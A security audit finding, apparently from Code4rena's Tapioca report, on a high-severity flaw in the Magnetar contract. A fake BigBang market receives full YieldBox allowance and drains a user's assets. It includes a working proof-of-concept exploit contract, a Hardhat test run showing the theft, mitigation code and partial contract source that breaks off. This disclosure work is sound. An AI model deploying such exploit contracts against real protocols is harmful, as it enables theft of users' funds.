{
  "Title": "[H-47] User's assets can be stolen when removing them from the Singularity market through the Magnetar contract",
  "Content": "\nAn Attacker can remove user's assets from Singularity Markets and steal them to an account of his own by abusing a vulnerability present in the Magnetar contract\n\n### Proof of Concept\n\n*   The [`Magnetar::exitPositionAndRemoveCollateral()`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/MagnetarV2.sol#L880-L904) can be used to exit from  tOB, unlock from tOLP, remove assets from Singularity markets, repay on BigBang markets, remove collateral from BigBang markets and withdraw, each of these steps are optional.\n\n*   When users wants to execute any operation through the Magnetar contract, the Magnetar contracts requires to have the user's approvals/permissions, that means, when the Magnetar contract executes something on behalf of the user, the Magnetar contract have already been granted permission/allowance on the called contract on the user's behalf.\n\n*   [When using the Magnetar contract to remove user assets from the Singularity market and use those assets to repay in a BigBang contract](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L568-L635), the Magnetar contract will receive the removed assets from the Singularity Market, grant ALL allowance to the BigBang contract in the YieldBox, and finally will call the BigBang.repay().\n\n*   The problem is that none of the two markets are checked to ensure that they are valid and supported contracts by the Protocol.\n\n*   This attack requires that an attacker creates a FakeBigBang contract (see Step 2 of the Coded PoC mini section!), and passes the address of this Fake BigBang contract as the address of the BigBang where the repayment will be done.\n    *   When the execution is forwarded to the FakeBigBang contract, the Magnetar contract had already granted ALL allowance to this Fake contract in the YieldBox, which makes possible to do a `YieldBox.transfer()` from the Magnetar contract to an account owned by the attacker.\n        *   The transferred assets from the Magnetar contract are the assets of the user that were removed from the Singularity market and that they were supposed to be used to repay the user's debt on the BigBang contract\n\n### Coded PoC\n\n*   I coded a PoC using the [`magnetar.test.ts`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/test/magnetar.test.ts) file as the base for this PoC.\n\n1.  The first step is to add the `attacker` account in the [`test.utils.ts`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/test/test.utils.ts) file\n\n```\n\n    > git diff --no-index test.utils.ts testPoC.utils.ts\n\n    diff --git a/test.utils.ts b/testPoC.utils.ts\n    index 00fc388..83107e6 100755\n    --- a/test.utils.ts\n    +++ b/testPoC.utils.ts\n    @@ -1023,8 +1023,14 @@ export async function register(staging?: boolean) {\n             ethers.provider,\n         );\n\n    +    const attacker = new ethers.Wallet(\n    +        ethers.Wallet.createRandom().privateKey,\n    +        ethers.provider,\n    +    );\n    +\n         if (!staging) {\n             await setBalance(eoa1.address, 100000);\n    +        await setBalance(attacker.address, 100000);\n         }\n\n         // ------------------- Deploy WethUSDC mock oracle -------------------\n    @@ -1314,6 +1320,7 @@ export async function register(staging?: boolean) {\n\n         if (!staging) {\n             await setBalance(eoa1.address, 100000);\n    +        await setBalance(attacker.address, 100000);\n         }\n\n         const initialSetup = {\n    @@ -1341,6 +1348,7 @@ export async function register(staging?: boolean) {\n             _sglLeverageModule,\n             magnetar,\n             eoa1,\n    +        attacker,\n             multiSwapper,\n             singularityFeeTo,\n             liquidationQueue,\n```\n\n2.  Now, let's create the `FakeBigBang` contract, make sure to create it under the [`tapioca-periph-audit/contract/`](https://github.com/Tapioca-DAO/tapioca-periph-audit/tree/023751a4e987cf7c203ab25d3abba58f7344f213/contracts) folder\n\n<details>\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// import \"@boringcrypto/boring-solidity/contracts/libraries/BoringRebase.sol\";\n\n//YIELDBOX\nimport \"tapioca-sdk/dist/contracts/YieldBox/contracts/YieldBox.sol\";\n\nimport \"./interfaces/IYieldBoxBase.sol\";\nimport \"./interfaces/IMarket.sol\";\n\ncontract FakeBigBang {\n  // using RebaseLibrary for Rebase;\n\n  IMarket realSingularityMarket;\n\n  IYieldBoxBase public yieldBox;\n  \n  /// @notice collateral token address\n  address public collateral;\n  /// @notice collateral token YieldBox id\n  uint256 public collateralId;\n  /// @notice asset token address\n  address public asset;\n  /// @notice asset token YieldBox id\n  uint256 public assetId;\n\n  uint256 public tOLPSglAssetId;\n\n  address magnetarContract;\n  \n  function setMarket(address _realSingularityMarket) external {\n    realSingularityMarket = IMarket(_realSingularityMarket);\n\n    collateral = realSingularityMarket.collateral();\n    collateralId = realSingularityMarket.collateralId();\n    asset = realSingularityMarket.asset();\n    assetId = realSingularityMarket.assetId();\n    yieldBox = IYieldBoxBase(realSingularityMarket.yieldBox());\n  }\n\n  function setMagnetar(address _magnetar) external {\n    magnetarContract = _magnetar;\n  }\n\n\n  //@audit => This is the function that will be called by the Magnetar contract\n  //@audit => This contract will be granted all permission over the Mangetar contract in the YieldBox, which will allow it to transfer all that Magnetar owns to any address\n  //@audit-info => repay() will transfer the singularity.assetId() from the YieldBox!\n  function repay(\n      address from,\n      address to,\n      bool skim,\n      uint256 part\n  ) external returns (uint256 amount) {\n\n    uint magnetarAssetBalance = yieldBox.balanceOf(magnetarContract,assetId);\n    yieldBox.transfer(magnetarContract, address(this), assetId, magnetarAssetBalance);\n\n    amount = type(uint256).max; \n  }\n}\n```\n\n</details>\n\n3.  Create a new file to reproduce this PoC, magnetar_remove_assets_from_singularity_PoC.test.ts\n\n*   Make sure to create this new test file under the [`tapioca-periph-audit/test/`](https://github.com/Tapioca-DAO/tapioca-periph-audit/tree/023751a4e987cf7c203ab25d3abba58f7344f213/test) folder\n\n<details>\n\n<!---->\n\n    import { expect } from 'chai';\n    import hre, { ethers, config } from 'hardhat';\n    import { BN, register, getSGLPermitSignature } from './test.utils';\n    import {\n        loadFixture,\n        takeSnapshot,\n    } from '@nomicfoundation/hardhat-network-helpers';\n\n    describe('MagnetarV2', () => {\n\n        describe('repay', () => {\n          it('should remove asset from Singularity and Attacker will steal those assets', async () => {\n            const {\n                weth,\n                createWethUsd0Singularity,\n                wethBigBangMarket,\n                usd0,\n                usdc,\n                bar,\n                wethAssetId,\n                mediumRiskMC,\n                deployCurveStableToUsdoBidder,\n                initContracts,\n                yieldBox,\n                magnetar,\n                deployer,\n                attacker,\n            } = await loadFixture(register);\n\n            await initContracts();\n\n            const usdoStratregy = await bar.emptyStrategies(usd0.address);\n            const usdoAssetId = await yieldBox.ids(\n                1,\n                usd0.address,\n                usdoStratregy,\n                0,\n            );\n            const { stableToUsdoBidder } = await deployCurveStableToUsdoBidder(\n                deployer,\n                bar,\n                usdc,\n                usd0,\n                false,\n            );\n            const { wethUsdoSingularity } = await createWethUsd0Singularity(\n                deployer,\n                usd0,\n                weth,\n                bar,\n                usdoAssetId,\n                wethAssetId,\n                mediumRiskMC,\n                yieldBox,\n                stableToUsdoBidder,\n                ethers.utils.parseEther('1'),\n                false,\n            );\n\n            //@audit => Attacker deploys the FakeBigBang contract!\n            const fakeBigBang = await ethers.deployContract(\"FakeBigBang\");\n\n            await fakeBigBang.setMarket(wethUsdoSingularity.address);  \n            await fakeBigBang.setMagnetar(magnetar.address);\n\n            const borrowAmount = ethers.BigNumber.from((1e18).toString()).mul(\n                100,\n            );\n            const wethMintVal = ethers.BigNumber.from((1e18).toString()).mul(\n                10,\n            );\n\n            await usd0.mint(deployer.address, borrowAmount.mul(2));\n            // We get asset\n            await weth.freeMint(wethMintVal);\n\n            // Approve tokens\n            // await approveTokensAndSetBarApproval();\n            await yieldBox.setApprovalForAll(wethUsdoSingularity.address, true);\n            await wethBigBangMarket.updateOperator(magnetar.address, true);\n            await weth.approve(magnetar.address, wethMintVal);\n            await wethUsdoSingularity.approve(\n                magnetar.address,\n                ethers.constants.MaxUint256,\n            );\n            await wethBigBangMarket.approveBorrow(\n                magnetar.address,\n                ethers.constants.MaxUint256,\n            );\n\n            await magnetar.mintFromBBAndLendOnSGL(\n                deployer.address,\n                borrowAmount,\n                {\n                    mint: true,\n                    mintAmount: borrowAmount,\n                    collateralDepositData: {\n                        deposit: true,\n                        amount: wethMintVal,\n                        extractFromSender: true,\n                    },\n                },\n                {\n                    deposit: false,\n                    amount: 0,\n                    extractFromSender: false,\n                },\n                {\n                    lock: false,\n                    amount: 0,\n                    lockDuration: 0,\n                    target: ethers.constants.AddressZero,\n                    fraction: 0,\n                },\n                {\n                    participate: false,\n                    target: ethers.constants.AddressZero,\n                    tOLPTokenId: 0,\n                },\n                {\n                    singularity: wethUsdoSingularity.address,\n                    magnetar: magnetar.address,\n                    bigBang: wethBigBangMarket.address,\n                },\n            );\n\n            await usd0.approve(yieldBox.address, ethers.constants.MaxUint256);\n            await yieldBox.depositAsset(\n                usdoAssetId,\n                deployer.address,\n                deployer.address,\n                borrowAmount,\n                0,\n            );\n            const wethCollateralBefore =\n                await wethBigBangMarket.userCollateralShare(deployer.address);\n            const fraction = await wethUsdoSingularity.balanceOf(\n                deployer.address,\n            );\n\n            const assetId = await wethUsdoSingularity.assetId();\n            \n            console.log(\"asset in YieldBox owned by Magnetar - BEFORE: \", await yieldBox.balanceOf(magnetar.address,assetId));\n            console.log(\"asset in YieldBox owned by User - BEFORE: \", await yieldBox.balanceOf(deployer.address,assetId));\n            console.log(\"asset in YieldBox owned by FakeBigBang - BEFORE: \", await yieldBox.balanceOf(fakeBigBang.address,assetId));\n\n            //@audit => magnetar contract already has been approved by the deployer contract to perform the removed asset operation in the Singularity Market\n            //@audit => The `attacker` executed the attack over the `deployer` address\n            //@audit => attacker will remove assets from the deployer in the Singularity market, and will transfer those assets to an account of his own by using a FakeBigBang contract!\n            await magnetar.connect(attacker).exitPositionAndRemoveCollateral(\n                deployer.address,\n                {\n                    magnetar: magnetar.address,\n                    singularity: wethUsdoSingularity.address,\n                    // bigBang: wethBigBangMarket.address,\n                    bigBang: fakeBigBang.address,\n                },\n                {\n                    removeAssetFromSGL: true,\n                    removeShare: fraction.div(2),\n                    repayAssetOnBB: true,\n                    repayAmount: await yieldBox.toAmount(\n                        usdoAssetId,\n                        fraction.div(3),\n                        false,\n                    ),\n                    removeCollateralFromBB: false,\n                    collateralShare: 0,\n                    exitData: {\n                        exit: false,\n                        oTAPTokenID: 0,\n                        target: ethers.constants.AddressZero,\n                    },\n                    unlockData: {\n                        unlock: false,\n                        target: ethers.constants.AddressZero,\n                        tokenId: 0,\n                    },\n                    assetWithdrawData: {\n                        withdraw: false,\n                        withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),\n                        withdrawLzChainId: 0,\n                        withdrawLzFeeAmount: 0,\n                        withdrawOnOtherChain: false,\n                    },\n                    collateralWithdrawData: {\n                        withdraw: false,\n                        withdrawAdapterParams: ethers.utils.toUtf8Bytes(''),\n                        withdrawLzChainId: 0,\n                        withdrawLzFeeAmount: 0,\n                        withdrawOnOtherChain: false,\n                    },\n                },\n            );\n            console.log(\"\\n\\n=======================================================================\\n\\n\");\n            console.log(\"asset in YieldBox owned by Magnetar - AFTER: \", await yieldBox.balanceOf(magnetar.address,assetId));\n            console.log(\"asset in YieldBox owned by User - AFTER: \", await yieldBox.balanceOf(deployer.address,assetId));\n            console.log(\"asset in YieldBox owned by FakeBigBang - AFTER: \", await yieldBox.balanceOf(fakeBigBang.address,assetId));\n\n          });\n        });\n\n    });\n\n</details>\n\n4.  After all the 3 previous steps have been completed, everything is ready to run the PoC.\n\n> npx hardhat test magnetar_remove_assets_from_singularity_PoC.test.ts\n\n      MagnetarV2\n        repay\n    asset in YieldBox owned by Magnetar - BEFORE:  BigNumber { value: \"0\" }\n    asset in YieldBox owned by User - BEFORE:  BigNumber { value: \"10000000000000000000000000000\" }\n    asset in YieldBox owned by FakeBigBang - BEFORE:  BigNumber { value: \"0\" }\n\n\n    =======================================================================\n\n\n    asset in YieldBox owned by Magnetar - AFTER:  BigNumber { value: \"0\" }\n    asset in YieldBox owned by User - AFTER:  BigNumber { value: \"10000000000000000000000000000\" }\n    asset in YieldBox owned by FakeBigBang - AFTER:  BigNumber { value: \"5000000000000000000000000000\" }\n          âœ” should remove asset from Singularity and Attacker will steal those assets (14114ms)\n\n### Recommended Mitigation Steps\n\n*   Use the Penrose contract to validate that the provided markets as parameters are real markets supported by the protocol (Both, BB & Singularity markets)\n*   Add the below checks on the [`_exitPositionAndRemoveCollateral()`](https://github.com/Tapioca-DAO/tapioca-periph-audit/blob/023751a4e987cf7c203ab25d3abba58f7344f213/contracts/Magnetar/modules/MagnetarMarketModule.sol#L495-L675) function\n\n```solidity\nfunction _exitPositionAndRemoveCollateral(\n    address user,\n    ICommonData.ICommonExternalContracts calldata externalData,\n    IUSDOBase.IRemoveAndRepay calldata removeAndRepayData\n) private {\n+   require(penrose.isMarketRegistered(externalData.bigBang), \"BigBang market is not a valid market supported by the protocol\");\n+   require(penrose.isMarketRegistered(externalData.singularity), \"Singularity market is not a valid market supported by the protocol\");\n\n    IMarket bigBang = IMarket(externalData.bigBang);\n    ISingularity singularity = ISingularity(externalData.singularity);\n    IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox());\n\n    ...\n    ...\n    ...\n}\n```\n\n**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/849#issuecomment-1700164092)**\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-tapioca",
  "Code": [
    {
      "filename": "contracts/Magnetar/MagnetarV2.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\n//OZ\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n//TAPIOCA\nimport \"./MagnetarV2Storage.sol\";\nimport \"./modules/MagnetarMarketModule.sol\";\n\n/*\n\n__/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\____/\\\\\\\\\\\\\\\\\\\\\\_______/\\\\\\\\\\_____________/\\\\\\\\\\\\\\\\\\_____/\\\\\\\\\\\\\\\\\\____        \n _\\///////\\\\\\/////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__\\/\\\\\\/////////\\\\\\_\\/////\\\\\\///______/\\\\\\///\\\\\\________/\\\\\\////////____/\\\\\\\\\\\\\\\\\\\\\\\\\\__       \n  _______\\/\\\\\\________/\\\\\\/////////\\\\\\_\\/\\\\\\_______\\/\\\\\\_____\\/\\\\\\_______/\\\\\\/__\\///\\\\\\____/\\\\\\/____________/\\\\\\/////////\\\\\\_      \n   _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\\\\\\\\\\\\\\\\\\\\\/______\\/\\\\\\______/\\\\\\______\\//\\\\\\__/\\\\\\_____________\\/\\\\\\_______\\/\\\\\\_     \n    _______\\/\\\\\\_______\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_\\/\\\\\\/////////________\\/\\\\\\_____\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_____________\\/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_    \n     _______\\/\\\\\\_______\\/\\\\\\/////////\\\\\\_\\/\\\\\\_________________\\/\\\\\\_____\\//\\\\\\______/\\\\\\__\\//\\\\\\____________\\/\\\\\\/////////\\\\\\_   \n      _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\_________________\\/\\\\\\______\\///\\\\\\__/\\\\\\_____\\///\\\\\\__________\\/\\\\\\_______\\/\\\\\\_  \n       _______\\/\\\\\\_______\\/\\\\\\_______\\/\\\\\\_\\/\\\\\\______________/\\\\\\\\\\\\\\\\\\\\\\____\\///\\\\\\\\\\/________\\////\\\\\\\\\\\\\\\\\\_\\/\\\\\\_______\\/\\\\\\_ \n        _______\\///________\\///________\\///__\\///______________\\///////////_______\\/////_____________\\/////////__\\///________\\///__\n\n*/\n\n/// @title Magnetar contract\n/// @notice Generic helper contract\n/// @dev can execute individual or combined actions on BigBang/Market/tOFT and USDO\n///      -  the `burst` method allows combining multiple calls into 1 transaction\ncontract MagnetarV2 is Ownable, MagnetarV2Storage {\n    using SafeERC20 for IERC20;\n    using RebaseLibrary for Rebase;\n\n    // ************ //\n    // *** VARS *** //\n    // ************ //\n    enum Module {\n        Market\n    }\n\n    /// @notice returns the Market module\n    MagnetarMarketModule public marketModule;\n\n    constructor(address _owner, address payable _marketModule) {\n        transferOwnership(_owner);\n        marketModule = MagnetarMarketModule(_marketModule);\n    }\n\n    // ******************** //\n    // *** VIEW METHODS *** //\n    // ******************** //\n    /// @notice returns Singularity markets' information\n    /// @param who user to return for\n    /// @param markets the list of Singularity markets to query for\n    function singularityMarketInfo(\n        address who,\n        ISingularity[] calldata markets\n    ) external view returns (SingularityInfo[] memory) {\n        return _singularityMarketInfo(who, markets);\n    }\n\n    /// @notice returns BigBang markets' information\n    /// @param who user to return for\n    /// @param markets the list of BigBang markets to query for\n    function bigBangMarketInfo(\n        address who,\n        IBigBang[] calldata markets\n    ) external view returns (BigBangInfo[] memory) {\n        return _bigBangMarketInfo(who, markets);\n    }\n\n    /// @notice Calculate the collateral amount off the shares.\n    /// @param market the Singularity or BigBang address\n    /// @param share The shares.\n    /// @return amount The amount.\n    function getCollateralAmountForShare(\n        IMarket market,\n        uint256 share\n    ) public view returns (uint256 amount) {\n        IYieldBoxBase yieldBox = IYieldBoxBase(market.yieldBox());\n        return yieldBox.toAmount(market.collateralId(), share, false);\n    }\n\n    /// @notice Calculate the collateral shares that are needed for `borrowPart`,\n    /// taking the current exchange rate into account.\n    /// @param market the Singularity or BigBang address\n    /// @param borrowPart The borrow part.\n    /// @return collateralShares The collateral shares.\n    function getCollateralSharesForBorrowPart(\n        IMarket market,\n        uint256 borrowPart,\n        uint256 liquidationMultiplierPrecision,\n        uint256 exchangeRatePrecision\n    ) public view returns (uint256 collateralShares) {\n        Rebase memory _totalBorrowed;\n        (uint128 totalBorrowElastic, uint128 totalBorrowBase) = market\n            .totalBorrow();\n        _totalBorrowed = Rebase(totalBorrowElastic, totalBorrowBase);\n\n        IYieldBoxBase yieldBox = IYieldBoxBase(market.yieldBox());\n        uint256 borrowAmount = _totalBorrowed.toElastic(borrowPart, false);\n        return\n            yieldBox.toShare(\n                market.collateralId(),\n                (borrowAmount *\n                    market.liquidationMultiplier() *\n                    market.exchangeRate()) /\n                    (liquidationMultiplierPrecision * exchangeRatePrecision),\n                false\n            );\n    }\n\n    /// @notice Return the equivalent of borrow part in asset amount.\n    /// @param market the Singularity or BigBang address\n    /// @param borrowPart The amount of borrow part to convert.\n    /// @return amount The equivalent of borrow part in asset amount.\n    function getAmountForBorrowPart(\n        IMarket market,\n        uint256 borrowPart\n    ) public view returns (uint256 amount) {\n        Rebase memory _totalBorrowed;\n        (uint128 totalBorrowElastic, uint128 totalBorrowBase) = market\n            .totalBorrow();\n        _totalBorrowed = Rebase(totalBorrowElastic, totalBorrowBase);\n\n        return _totalBorrowed.toElastic(borrowPart, false);\n    }\n\n    /// @notice Return the equivalent of amount in borrow part.\n    /// @param market the Singularity or BigBang address\n    /// @param amount The amount to convert.\n    /// @return part The equivalent of amount in borrow part.\n    function getBorrowPartForAmount(\n        IMarket market,\n        uint256 amount\n    ) public view returns (uint256 part) {\n        Rebase memory _totalBorrowed;\n        (uint128 totalBorrowElastic, uint128 totalBorrowBase) = market\n            .totalBorrow();\n        _totalBorrowed = Rebase(totalBorrowElastic, totalBorrowBase);\n\n        return _totalBorrowed.toBase(amount, false);\n    }\n\n    /// @notice Compute the amount of `singularity.assetId` from `fraction`\n    /// `fraction` can be `singularity.accrueInfo.feeFraction` or `singularity.balanceOf`\n    /// @param singularity the singularity address\n    /// @param fraction The fraction.\n    /// @return amount The amount.\n    function getAmountForAssetFraction(\n        ISingularity singularity,\n        uint256 fraction\n    ) public view returns (uint256 amount) {\n        (uint128 totalAssetElastic, uint128 totalAssetBase) = singularity\n            .totalAsset();\n\n        IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox());\n        return\n            yieldBox.toAmount(\n                singularity.assetId(),\n                (fraction * totalAssetElastic) / totalAssetBase,\n                false\n            );\n    }\n\n    /// @notice Compute the fraction of `singularity.assetId` from `amount`\n    /// `fraction` can be `singularity.accrueInfo.feeFraction` or `singularity.balanceOf`\n    /// @param singularity the singularity address\n    /// @param amount The amount.\n    /// @return fraction The fraction.\n    function getFractionForAmount(\n        ISingularity singularity,\n        uint256 amount\n    ) public view returns (uint256 fraction) {\n        (uint128 totalAssetShare, uint128 totalAssetBase) = singularity\n            .totalAsset();\n        (uint128 totalBorrowElastic, ) = singularity.totalBorrow();\n        uint256 assetId = singularity.assetId();\n\n        IYieldBoxBase yieldBox = IYieldBoxBase(singularity.yieldBox());\n\n        uint256 share = yieldBox.toShare(assetId, amount, false);\n        uint256 allShare = totalAssetShare +\n            yieldBox.toShare(assetId, totalBorrowElastic, true);\n\n        fraction = allShare == 0 ? share : (share * totalAssetBase) / allShare;\n    }\n\n    // ********************** //\n    // *** PUBLIC METHODS *** //\n    // ********************** //\n    /// @notice Batch multiple calls together\n    /// @param calls The list of actions to perform\n    function burst(\n        Call[] calldata calls\n    ) external payable returns (Result[] memory returnData) {\n        uint256 valAccumulator;\n\n        uint256 length = calls.length;\n        returnData = new Result[](length);\n\n        for (uint256 i = 0; i < length; i++) {\n            Call calldata _action = calls[i];\n            if (!_action.allowFailure) {\n                require(\n                    _action.call.length > 0,\n                    string.concat(\n                        \"MagnetarV2: Missing call for action with index\",\n                        string(abi.encode(i))\n                    )\n                );\n            }\n\n            unchecked {\n                valAccumulator += _action.value;\n            }\n\n            if (_action.id == PERMIT_ALL) {\n                _permit(\n                    _action.target,\n                    _action.call,\n                    true,\n                    _action.allowFailure\n                );\n            } else if (_action.id == PERMIT) {\n                _permit(\n                    _action.target,\n                    _action.call,\n                    false,\n                    _action.allowFailure\n                );\n            } else if (_action.id == TOFT_WRAP) {\n                WrapData memory data = abi.decode(_action.call[4:], (WrapData));\n                _checkSender(data.from);\n                if (_action.value > 0) {\n                    unchecked {\n                        valAccumulator += _action.value;\n                    }\n                    ITapiocaOFT(_action.target).wrapNative{\n                        value: _action.value\n                    }(data.to);\n                } else {\n                    ITapiocaOFT(_action.target).wrap(\n                        msg.sender,\n                        data.to,\n                        data.amount\n                    );\n                }\n            } else if (_action.id == TOFT_SEND_FROM) {\n                (\n                    address from,\n                    uint16 dstChainId,\n                    bytes32 to,\n                    uint256 amount,\n                    ISendFrom.LzCallParams memory lzCallParams\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            uint16,\n                            bytes32,\n                            uint256,\n                            (ISendFrom.LzCallParams)\n                        )\n                    );\n                _checkSender(from);\n\n                ISendFrom(_action.target).sendFrom{value: _action.value}(\n                    msg.sender,\n                    dstChainId,\n                    to,\n                    amount,\n                    lzCallParams\n                );\n            } else if (_action.id == YB_DEPOSIT_ASSET) {\n                YieldBoxDepositData memory data = abi.decode(\n                    _action.call[4:],\n                    (YieldBoxDepositData)\n                );\n                _checkSender(data.from);\n\n                (uint256 amountOut, uint256 shareOut) = IYieldBoxBase(\n                    _action.target\n                ).depositAsset(\n                        data.assetId,\n                        msg.sender,\n                        data.to,\n                        data.amount,\n                        data.share\n                    );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(amountOut, shareOut)\n                });\n            } else if (_action.id == MARKET_ADD_COLLATERAL) {\n                SGLAddCollateralData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLAddCollateralData)\n                );\n                _checkSender(data.from);\n\n                IMarket(_action.target).addCollateral(\n                    msg.sender,\n                    data.to,\n                    data.skim,\n                    data.amount,\n                    data.share\n                );\n            } else if (_action.id == MARKET_BORROW) {\n                SGLBorrowData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLBorrowData)\n                );\n                _checkSender(data.from);\n\n                (uint256 part, uint256 share) = IMarket(_action.target).borrow(\n                    msg.sender,\n                    data.to,\n                    data.amount\n                );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(part, share)\n                });\n            } else if (_action.id == YB_WITHDRAW_TO) {\n                (\n                    address yieldBox,\n                    address from,\n                    uint256 assetId,\n                    uint16 dstChainId,\n                    bytes32 receiver,\n                    uint256 amount,\n                    uint256 share,\n                    bytes memory adapterParams,\n                    address payable refundAddress\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint256,\n                            uint16,\n                            bytes32,\n                            uint256,\n                            uint256,\n                            bytes,\n                            address\n                        )\n                    );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule.withdrawToChain.selector,\n                        yieldBox,\n                        from,\n                        assetId,\n                        dstChainId,\n                        receiver,\n                        amount,\n                        share,\n                        adapterParams,\n                        refundAddress,\n                        _action.value\n                    )\n                );\n            } else if (_action.id == MARKET_LEND) {\n                SGLLendData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLLendData)\n                );\n                _checkSender(data.from);\n\n                uint256 fraction = IMarket(_action.target).addAsset(\n                    msg.sender,\n                    data.to,\n                    data.skim,\n                    data.share\n                );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(fraction)\n                });\n            } else if (_action.id == MARKET_REPAY) {\n                SGLRepayData memory data = abi.decode(\n                    _action.call[4:],\n                    (SGLRepayData)\n                );\n                _checkSender(data.from);\n\n                uint256 amount = IMarket(_action.target).repay(\n                    msg.sender,\n                    data.to,\n                    data.skim,\n                    data.part\n                );\n                returnData[i] = Result({\n                    success: true,\n                    returnData: abi.encode(amount)\n                });\n            } else if (_action.id == TOFT_SEND_AND_BORROW) {\n                (\n                    address from,\n                    address to,\n                    uint16 lzDstChainId,\n                    bytes memory airdropAdapterParams,\n                    ITapiocaOFT.IBorrowParams memory borrowParams,\n                    ICommonData.IWithdrawParams memory withdrawParams,\n                    ICommonData.ISendOptions memory options,\n                    ICommonData.IApproval[] memory approvals\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint16,\n                            bytes,\n                            ITapiocaOFT.IBorrowParams,\n                            ICommonData.IWithdrawParams,\n                            ICommonData.ISendOptions,\n                            ICommonData.IApproval[]\n                        )\n                    );\n                _checkSender(from);\n\n                ITapiocaOFT(_action.target).sendToYBAndBorrow{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    to,\n                    lzDstChainId,\n                    airdropAdapterParams,\n                    borrowParams,\n                    withdrawParams,\n                    options,\n                    approvals\n                );\n            } else if (_action.id == TOFT_SEND_AND_LEND) {\n                (\n                    address from,\n                    address to,\n                    uint16 dstChainId,\n                    address zroPaymentAddress,\n                    IUSDOBase.ILendOrRepayParams memory lendParams,\n                    ICommonData.IApproval[] memory approvals,\n                    ICommonData.IWithdrawParams memory withdrawParams,\n                    bytes memory adapterParams\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint16,\n                            address,\n                            (IUSDOBase.ILendOrRepayParams),\n                            (ICommonData.IApproval[]),\n                            (ICommonData.IWithdrawParams),\n                            bytes\n                        )\n                    );\n                _checkSender(from);\n\n                IUSDOBase(_action.target).sendAndLendOrRepay{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    to,\n                    dstChainId,\n                    zroPaymentAddress,\n                    lendParams,\n                    approvals,\n                    withdrawParams,\n                    adapterParams\n                );\n            } else if (_action.id == TOFT_DEPOSIT_TO_STRATEGY) {\n                TOFTSendToStrategyData memory data = abi.decode(\n                    _action.call[4:],\n                    (TOFTSendToStrategyData)\n                );\n                _checkSender(data.from);\n\n                ITapiocaOFT(_action.target).sendToStrategy{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    data.to,\n                    data.amount,\n                    data.share,\n                    data.assetId,\n                    data.lzDstChainId,\n                    data.options\n                );\n            } else if (_action.id == TOFT_RETRIEVE_FROM_STRATEGY) {\n                (\n                    address from,\n                    uint256 amount,\n                    uint256 share,\n                    uint256 assetId,\n                    uint16 lzDstChainId,\n                    address zroPaymentAddress,\n                    bytes memory airdropAdapterParam\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            uint256,\n                            uint256,\n                            uint256,\n                            uint16,\n                            address,\n                            bytes\n                        )\n                    );\n\n                _checkSender(from);\n\n                ITapiocaOFT(_action.target).retrieveFromStrategy{\n                    value: _action.value\n                }(\n                    msg.sender,\n                    amount,\n                    share,\n                    assetId,\n                    lzDstChainId,\n                    zroPaymentAddress,\n                    airdropAdapterParam\n                );\n            } else if (_action.id == MARKET_YBDEPOSIT_AND_LEND) {\n                HelperLendData memory data = abi.decode(\n                    _action.call[4:],\n                    (HelperLendData)\n                );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule.mintFromBBAndLendOnSGL.selector,\n                        data.user,\n                        data.lendAmount,\n                        data.mintData,\n                        data.depositData,\n                        data.lockData,\n                        data.participateData,\n                        data.externalContracts\n                    )\n                );\n            } else if (_action.id == MARKET_YBDEPOSIT_COLLATERAL_AND_BORROW) {\n                (\n                    address market,\n                    address user,\n                    uint256 collateralAmount,\n                    uint256 borrowAmount,\n                    ,\n                    bool deposit,\n                    ICommonData.IWithdrawParams memory withdrawParams\n                ) = abi.decode(\n                        _action.call[4:],\n                        (\n                            address,\n                            address,\n                            uint256,\n                            uint256,\n                            bool,\n                            bool,\n                            ICommonData.IWithdrawParams\n                        )\n                    );\n\n                _executeModule(\n                    Module.Market,\n                    abi.encodeWithSelector(\n                        MagnetarMarketModule\n                            .depositAddCollateralAndBorrowFromMarket\n                            .selector,\n                        market,\n                        user,\n                        collateralAmount,\n                        borrowAmount,\n                        false,\n                        deposit,\n                        withdrawParams\n                    